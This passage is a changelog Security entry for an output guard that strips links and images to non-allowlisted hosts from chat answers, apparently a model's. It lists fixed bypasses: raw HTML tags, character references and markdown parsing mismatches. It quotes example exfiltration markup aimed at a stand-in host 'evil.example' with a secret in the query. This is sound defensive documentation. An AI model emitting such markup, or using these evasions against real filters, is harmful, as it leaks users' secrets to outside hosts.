@@ -58,6 +58,35 @@ Before 1.0, minor versions may contain breaking changes; they are listed under
 
 ### Security
 
+- The output guard checked only `<img>` among HTML tags: an answer with
+  `<a href="https://evil.example/?d=SECRET">x</a>` kept it, so a chat
+  interface that renders raw HTML showed a clickable link to a host off the
+  allowlist (v0.3.0 and earlier, whole answers and streams), and the same
+  with `<iframe src>`, `<video poster>`, `<form action>`, a `style` with
+  `url()` and other elements. The guard now reads every start tag as a
+  browser's tokenizer does (any case, quoted or unquoted values, line breaks
+  in the tag, `>` inside quotes, character references such as
+  `&#x68;ttps:`, a tag inside another tag's attribute) and checks each URL a
+  browser follows or loads against the allowlist, so `javascript:` and
+  `data:` URLs go too. A tag that needs a click (`<a href>`, `ping`, `<area
+  href>`, `<form action>`, `formaction`) is removed alone like a markdown
+  link, its text up to `</a>` kept and checked; one that loads by itself
+  (`src`, `srcset`, `poster`, `<object data>`, `<link href>`, `<base
+  href>`, SVG `href`, `background`, `style` with `url()`, `<style>`, a meta
+  refresh, `srcdoc`, an event handler) is replaced with `[REDACTED:image]`.
+  An `<img>` tag is now read the same way, so `>` inside a quoted value no
+  longer ends it early. Streams hold an open tag until its `>` and send
+  what the whole answer would be; markup that a removal turns into a tag is
+  caught by the re-check. Tests render the guarded output with goldmark (raw
+  HTML on) and also take it as HTML as it stands, parse the page with
+  `golang.org/x/net/html` (test-only use) and fail on any element or
+  attribute above that reaches a host off the allowlist.
+  The fuzz test, extended with HTML, also found two markdown forms the guard
+  read differently from goldmark, now fixed: a link title that runs over
+  lines or holds an escaped quote (`[t](https://evil.example/x "a\" b")`)
+  kept the link, and a DEL character (0x7F) ended a bare URL early, so an
+  autolink `<https://evil.example/x….png?d=…>` with one inside kept an image
+  URL with a query.
 - The output guard could let an image or link to a host off the allowlist
   through (v0.3.0 and earlier, whole answers and streams) when removing
   markup joined what was around it into new markup that it never checked:
